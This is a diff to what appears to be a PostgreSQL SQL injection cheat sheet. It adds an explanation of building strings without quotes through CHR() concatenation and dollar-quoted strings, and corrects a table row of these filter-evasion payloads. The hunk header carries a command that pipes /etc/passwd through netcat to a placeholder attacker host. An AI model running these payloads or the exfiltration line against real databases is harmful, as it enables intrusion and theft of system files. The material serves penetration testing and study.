@@ -256,10 +256,12 @@ SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 
 ### Alternative to Quotes
 
+PostgreSQL offers several ways to construct string values without using standard single-quoted literals. The `CHR()` function can generate individual characters from their numeric character codes, which can then be combined using the concatenation operator (`||`). PostgreSQL also supports dollar-quoted strings, available since version 8, allowing text to be enclosed between `$$` delimiters without escaping embedded single quotes.
+
 | Payload            | Technique |
 | ------------------ | --------- |
 | `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
-| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |
+| `SELECT $$NoQuote$$` | Dollar-Quoted String ( >= version 8 PostgreSQL) |
 
 ## PostgreSQL Privileges
 
